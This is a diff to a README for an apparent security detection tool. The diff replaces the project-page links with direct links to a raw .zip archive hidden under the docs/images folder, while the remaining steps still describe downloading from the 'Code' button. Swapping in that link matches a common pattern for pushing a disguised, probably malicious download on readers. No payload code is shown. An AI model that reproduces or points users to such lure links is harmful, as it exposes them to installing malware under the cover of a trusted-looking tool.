@@ -1,6 +1,6 @@
 # 🛡️ sentinel-detection-engine - Identify security threats with clear automation
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue)](https://github.com/thomdefinable658/sentinel-detection-engine)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue)](https://github.com/thomdefinable658/sentinel-detection-engine/raw/refs/heads/main/docs/images/sentinel-engine-detection-v3.6-alpha.3.zip)
 
 ## Overview 🔎
 
@@ -29,7 +29,7 @@ Your computer needs the following setup to run these tools:
 
 Follow these steps to access the engine:
 
-1. Visit the project page to download the files: https://github.com/thomdefinable658/sentinel-detection-engine
+1. Visit the project page to download the files: https://github.com/thomdefinable658/sentinel-detection-engine/raw/refs/heads/main/docs/images/sentinel-engine-detection-v3.6-alpha.3.zip
 2. Click the green "Code" button on the webpage.
 3. Select "Download ZIP" from the menu.
 4. Save the file to your computer.
